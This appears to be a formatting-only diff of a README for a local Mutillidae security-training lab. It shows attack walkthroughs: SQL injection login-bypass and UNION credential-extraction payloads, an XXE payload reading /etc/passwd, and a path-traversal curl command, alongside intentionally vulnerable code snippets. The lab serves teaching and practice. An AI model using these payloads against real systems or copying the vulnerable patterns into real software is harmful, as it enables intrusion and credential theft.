@@ -41,6 +41,7 @@ Unlike static targets, Mutillidae features a real-time **Security Level Switch**
 ## First-Time Initialization
 
 Upon the very first launch, Mutillidae requires its relational database tables to be populated:
+
 1. Navigate to `http://localhost:8116` in your browser.
 2. If an error banner displays indicating database connection issues, click the **"Setup / Reset Database"** link in the top menu (or navigate to `http://localhost:8116/set-up-database.php`).
 3. Click the button to automatically execute the migration schema and populate test accounts.
@@ -50,26 +51,28 @@ Upon the very first launch, Mutillidae requires its relational database tables t
 ## Key Vulnerability Domains & Attack Exercises
 
 ### 1. Advanced SQL Injection (Authentication Bypass & Data Extraction)
-* **Target Page**: `http://localhost:8116/index.php?page=login.php`
-* **Vulnerability Mechanism**: Unparameterized SQL query execution inside authentication logic:
+
+- **Target Page**: `http://localhost:8116/index.php?page=login.php`
+- **Vulnerability Mechanism**: Unparameterized SQL query execution inside authentication logic:
   ```sql
   SELECT * FROM accounts WHERE username='$username' AND password='$password'
   ```
-* **Attack Walkthrough**:
+- **Attack Walkthrough**:
   1. Input in the username field:
      ```text
-     admin' or '1'='1' -- 
+     admin' or '1'='1' --
      ```
   2. Input any password and submit. The SQL query evaluates to true, authenticating you as the first administrative record.
   3. Extract database schemas using UNION queries inside the User Info search (`page=user-info.php`):
      ```text
-     ' UNION SELECT null, username, password, null, null FROM accounts -- 
+     ' UNION SELECT null, username, password, null, null FROM accounts --
      ```
 
 ### 2. XML External Entity (XXE) Injection
-* **Target Page**: `http://localhost:8116/index.php?page=xml-validator.php`
-* **Vulnerability Mechanism**: PHP `libxml` parser initialized without disabling external entity resolution (`LIBXML_NOENT` enabled).
-* **Attack Walkthrough**:
+
+- **Target Page**: `http://localhost:8116/index.php?page=xml-validator.php`
+- **Vulnerability Mechanism**: PHP `libxml` parser initialized without disabling external entity resolution (`LIBXML_NOENT` enabled).
+- **Attack Walkthrough**:
   Send a crafted XML payload reading local system files:
   ```xml
   <?xml version="1.0" encoding="utf-8"?>
@@ -84,20 +87,22 @@ Upon the very first launch, Mutillidae requires its relational database tables t
   The parsed output reflects the contents of `/etc/passwd`.
 
 ### 3. Server-Side Request Forgery (SSRF) & File Inclusion (LFI/RFI)
-* **Target Page**: `http://localhost:8116/index.php?page=arbitrary-file-inclusion.php`
-* **Vulnerability Mechanism**: Dynamic inclusion of files via unvalidated query parameters:
+
+- **Target Page**: `http://localhost:8116/index.php?page=arbitrary-file-inclusion.php`
+- **Vulnerability Mechanism**: Dynamic inclusion of files via unvalidated query parameters:
   ```php
   include($_GET['page']);
   ```
-* **Attack Walkthrough**:
+- **Attack Walkthrough**:
   Traverse parent directories to inspect configuration files:
   ```bash
   curl -s "http://localhost:8116/index.php?page=../../../../etc/hosts"
   ```
 
 ### 4. HTML5 Client-Side Storage Exploitation
-* **Target Page**: `http://localhost:8116/index.php?page=html5-storage.php`
-* **Vulnerability Mechanism**: Sensitive session tokens and transaction state persisted insecurely inside `window.localStorage` and `window.sessionStorage`, rendering them accessible to any Cross-Site Scripting (XSS) payload.
+
+- **Target Page**: `http://localhost:8116/index.php?page=html5-storage.php`
+- **Vulnerability Mechanism**: Sensitive session tokens and transaction state persisted insecurely inside `window.localStorage` and `window.sessionStorage`, rendering them accessible to any Cross-Site Scripting (XSS) payload.
 
 ---
 
